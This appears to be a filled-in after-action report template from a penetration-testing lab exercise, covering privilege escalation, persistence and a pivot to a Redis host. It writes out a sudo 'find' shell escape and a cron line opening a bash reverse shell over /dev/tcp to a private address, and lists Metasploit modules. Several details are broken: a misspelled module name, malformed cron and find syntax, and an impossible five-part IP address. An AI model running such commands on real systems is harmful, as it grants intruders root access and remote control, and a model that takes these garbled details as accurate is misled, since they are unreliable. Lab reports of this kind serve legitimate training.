# OPERATION DEEP PIVOT: AFTER ACTION REPORT
**Operator:** ## PHASE 1: PRIVILEGE ESCALATION
* **Initial Access User:** mercenary
* **Vulnerable Sudo Binary:** [/usr/bin/find]
* **GTFOBins Exploit Command Used:** [sudo find . -exec /bin/sh;]

## PHASE 2: PERSISTENCE
* **Cron Syntax Used:** [***** /bin/bash -c 'bash -i >& /dev/tcp/192.168.64.2/4444 0>&1']
* **Persistence Confirmed:** yes

## PHASE 3: LATERAL MOVEMENT (THE PIVOT)
* **Metasploit Modules Used:** [explot/multi/handler, auxiliary/scanner/ssh/ssh_login, auxiliary/server/socks_proxy]
* **Hidden Database IP Discovered:** [10.0.10.0.50]
* **Open Port on Hidden Database:** [6379 redis]
